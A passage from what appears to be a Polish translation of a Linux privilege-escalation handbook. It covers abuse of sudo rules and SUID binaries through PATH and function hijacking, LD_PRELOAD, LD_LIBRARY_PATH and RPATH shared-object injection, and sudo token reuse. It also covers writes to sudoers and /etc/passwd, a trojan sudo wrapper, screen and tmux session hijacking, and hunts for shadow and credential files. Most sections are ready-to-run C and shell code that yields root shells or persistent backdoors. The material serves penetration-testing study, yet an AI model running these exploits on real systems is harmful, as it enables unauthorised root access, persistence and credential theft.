- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binarkę, która wywołuje polecenia bez ścieżek absolutnych (`free`, `df`, `ps` itd.), oraz zapisywalny wpis PATH wyszukiwany jako pierwszy.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Omijanie ścieżek podczas wykonywania przez Sudo
**Jump** aby odczytywać inne pliki lub używać **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyto **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie Sudo/plik binarny SUID bez ścieżki do polecenia

Jeśli **uprawnienie sudo** zostało przyznane do pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_, możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarny **suid** **wykonuje inne polecenie bez określania jego ścieżki (zawsze sprawdzaj za pomocą** _**strings**_ **zawartość nietypowego binarnego pliku SUID)**.

[Przykłady payloadów do wykonania.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binarny SUID ze ścieżką polecenia

Jeśli binarny **suid** **wykonuje inne polecenie, określając jego ścieżkę**, możesz spróbować **wyeksportować funkcję** o nazwie takiej samej jak polecenie wywoływane przez plik suid.

Na przykład, jeśli binarny plik suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz plik binarny SUID, ta funkcja zostanie wykonana

### Skrypt z prawem zapisu wykonywany przez wrapper SUID

Częstą błędną konfiguracją custom-app jest należący do roota wrapper binarny SUID, który wykonuje skrypt, podczas gdy sam skrypt może być modyfikowany przez użytkowników z niskimi uprawnieniami.

Typowy wzorzec:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Jeśli plik `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać polecenia payloadu, a następnie wykonać wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Szybkie sprawdzenia:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ta ścieżka ataku jest szczególnie powszechna w wrapperach „maintenance”/„backup” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określania jednej lub większej liczby bibliotek współdzielonych (plików .so), które mają zostać załadowane przez loader przed wszystkimi innymi bibliotekami, w tym przed standardową biblioteką C (`libc.so`). Proces ten jest znany jako preloading biblioteki.

Aby jednak zachować bezpieczeństwo systemu i zapobiec wykorzystywaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza określone warunki:

- Loader ignoruje **LD_PRELOAD** w przypadku plików wykonywalnych, dla których rzeczywisty identyfikator użytkownika (_ruid_) nie jest zgodny z efektywnym identyfikatorem użytkownika (_euid_).
- W przypadku plików wykonywalnych z suid/sgid preloadowane są wyłącznie biblioteki znajdujące się w standardowych ścieżkach, które również mają suid/sgid.

Privilege escalation może wystąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo`, a wynik `sudo -l` zawiera instrukcję **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala na zachowanie zmiennej środowiskowej **LD_PRELOAD** i jej rozpoznawanie nawet podczas uruchamiania poleceń za pomocą `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj go** za pomocą:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec **eskaluj uprawnienia**, uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Podczas napotkania pliku binarnego z uprawnieniami **SUID**, który wydaje się nietypowy, warto sprawdzić, czy prawidłowo ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość wykorzystania.

Aby to wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie shell z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Wreszcie uruchomienie podatnego pliku binarnego SUID powinno uruchomić exploit, potencjalnie umożliwiając przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy plik binarny SUID ładujący bibliotekę z folderu, do którego możemy zapisywać, utwórzmy w tym folderze bibliotekę o wymaganej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
oznacza to, że wygenerowana biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to wyselekcjonowana lista binariów Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) działa tak samo, ale w przypadkach, w których możesz **wstrzykiwać wyłącznie argumenty** do polecenia.

Projekt gromadzi legalne funkcje binariów Unix, które mogą zostać wykorzystane do ucieczki z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania bind i reverse shells oraz ułatwiania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie dowolnej reguły sudo.

### Ponowne użycie tokenów Sudo

W przypadkach, gdy masz **dostęp sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.

Wymagania dotyczące eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- Użytkownik "_sampleuser_" **używał `sudo`** do wykonania czegoś **w ciągu ostatnich 15 minut** (domyślnie jest to czas ważności tokenu sudo, który pozwala nam używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (musisz mieć możliwość jego przesłania)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` albo trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy binarium `activate_sudo_token` w _/tmp_. Możesz go użyć do **aktywowania tokenu sudo w swojej sesji** (automatycznie nie otrzymasz shella root, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do root z ustawionym setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i pozwoli wszystkim użytkownikom korzystać z sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych plików znajdujących się w tym folderze, możesz użyć pliku binarnego [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć sudo token dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell tego użytkownika z PID-em 1234, możesz **uzyskać uprawnienia sudo** bez znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki znajdujące się w `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Pliki te **domyślnie mogą być odczytywane wyłącznie przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać interesujące informacje**, a jeśli możesz **zapisywać** w dowolnym pliku, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz możliwość zapisu, możesz wykorzystać to uprawnienie.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla pliku binarnego `sudo`, takie jak `doas` dla OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Jeśli `doas` zezwala na użycie edytora lub interpretera, sprawdź obejścia w stylu GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a Ty uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona Twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), aby podczas wykonywania przez użytkownika `sudo` uruchamiany był Twój plik wykonywalny sudo.

Pamiętaj, że jeśli użytkownik korzysta z innego shella (nie bash), musisz zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie wyszukiwał biblioteki wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którejkolwiek ze wskazanych lokalizacji: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnym folderze określonym w pliku konfiguracyjnym wewnątrz `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następującej stronie:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, sprawisz, że program użyje jej w tym miejscu, zgodnie ze zmienną `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **procesowi podzbiór dostępnych uprawnień root**. Skutecznie rozbija to **uprawnienia root na mniejsze i odrębne jednostki**. Każda z tych jednostek może być następnie niezależnie przyznawana procesom. W ten sposób pełny zestaw uprawnień zostaje ograniczony, co zmniejsza ryzyko wykorzystania podatności.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i sposobach ich nadużywania**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu **bit „execute”** oznacza, że dany użytkownik może wykonać "**cd**" do folderu.\
Bit **„read”** oznacza, że użytkownik może **wyświetlać listę** **plików**, a bit **„write”** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) reprezentują drugą warstwę uznaniowych uprawnień, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Uprawnienia te zwiększają kontrolę nad dostępem do plików lub katalogów, umożliwiając przyznawanie lub odmawianie praw określonym użytkownikom, którzy nie są właścicielami ani nie należą do grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Więcej informacji można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Ukryty backdoor ACL w plikach drop-in sudoers

Częstą błędną konfiguracją jest należący do roota plik w `/etc/sudoers.d/` z uprawnieniami `440`, który za pośrednictwem ACL nadal przyznaje użytkownikowi o niskich uprawnieniach dostęp do zapisu.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo pomimo restrykcyjnych bitów uprawnień:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Jest to ścieżka persistence/privesc z wykorzystaniem ACL o dużym wpływie, ponieważ łatwo ją przeoczyć podczas przeglądów ograniczonych wyłącznie do `ls -l`.

## Otwarte sesje shell

W **starych wersjach** możesz przejąć (**hijack**) niektóre sesje **shell** innego użytkownika (**root**).\
W **nowszych wersjach** będzie można **łączyć się** z sesjami screen wyłącznie własnego użytkownika. Możesz jednak znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wyświetl listę sesji screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Lokalizacje socketów (niektóre systemy udostępniają jeden jako dowiązanie symboliczne do drugiego): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Przejmowanie sesji tmux

Był to problem dotyczący **starych wersji tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez użytkownika root jako użytkownik bez uprawnień.

**Wyświetlanie sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Lokalizacje socketów (niektóre systemy udostępniają jeden jako dowiązanie symboliczne do drugiego) - przejmowanie sesji tmux: tmux -S /tmp/dev sess ls Wyświetl listę za pomocą tego socketu; możesz uruchomić sesję tmux na tym sockecie...](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane w systemach opartych na Debianie (Ubuntu, Kubuntu itp.) między wrześniem 2006 a 13 maja 2008 roku mogą być podatne na ten błąd.\
Błąd ten występuje podczas tworzenia nowego klucza ssh w tych systemach, ponieważ **możliwych było tylko 32 768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh, można wyszukać odpowiadający mu klucz prywatny**. Obliczone możliwości można znaleźć tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interesujące wartości konfiguracji SSH

- **PasswordAuthentication:** Określa, czy uwierzytelnianie za pomocą hasła jest dozwolone. Domyślna wartość to `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą publicznego klucza jest dozwolone. Domyślna wartość to `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie za pomocą hasła jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustymi hasłami. Domyślna wartość to `no`.

### Pliki kontroli logowania

Te pliki wpływają na to, kto może się logować i w jaki sposób:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowanie użytkowników innych niż root i wyświetla jego komunikat.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (lista dozwolonych TTY).
- **`/etc/motd`**: baner po zalogowaniu (może ujawniać informacje o środowisku lub szczegółach konserwacji).

### PermitRootLogin

Określa, czy root może logować się za pomocą ssh; domyślna wartość to `no`. Możliwe wartości:

- `yes`: root może logować się za pomocą hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się wyłącznie za pomocą klucza prywatnego
- `forced-commands-only`: root może logować się wyłącznie za pomocą klucza prywatnego oraz jeśli określono opcje commands
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające publiczne klucze, których można używać do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Można wskazać ścieżki absolutne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny twojego klucza z kluczami znajdującymi się w `/home/testusername/.ssh/authorized_keys` oraz `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding umożliwia **używanie lokalnych kluczy SSH zamiast pozostawiania kluczy** (bez passphrase!) na serwerze. Dzięki temu będziesz w stanie wykonać **jump** przez ssh **do hosta**, a następnie z tego hosta wykonać **jump do kolejnego** hosta **przy użyciu** **klucza** znajdującego się na **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik przechodzi na inną maszynę, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisywać te opcje** oraz zezwalać na tę konfigurację lub jej zabraniać.\
Plik `/etc/sshd_config` może zezwalać na **forwarding ssh-agent** lub go blokować za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest dozwolony).

Jeśli znajdziesz w środowisku skonfigurowany Forward Agent, przeczytaj następującą stronę, ponieważ **możesz być w stanie go wykorzystać do eskalacji uprawnień**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki znajdujące się w `/etc/profile.d/` to **skrypty wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego jeśli możesz **zapisywać lub modyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś nietypowy skrypt profilu, powinieneś go sprawdzić pod kątem **wrażliwych danych**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **odnaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć, **czy w plikach znajdują się hashe**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach w pliku `/etc/passwd` (lub jego odpowiedniku) można znaleźć **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z poniższych poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych wierszy, aby dodać dummy user bez hasła.\
OSTRZEŻENIE: może to obniżyć obecny poziom bezpieczeństwa maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` oraz `/etc/master.passwd`, a `/etc/shadow` zmienia nazwę na `/etc/spwd.db`.

Należy sprawdzić, czy można **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy można zapisywać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **modyfikować plik konfiguracji usługi Tomcat znajdujący się w /etc/systemd/,** możesz zmodyfikować wiersze:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany przy następnym uruchomieniu tomcata.

### Sprawdzanie folderów

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz mieć możliwości odczytania ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/pliki będące własnością
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki baz danych SQLite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Pliki binarne w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
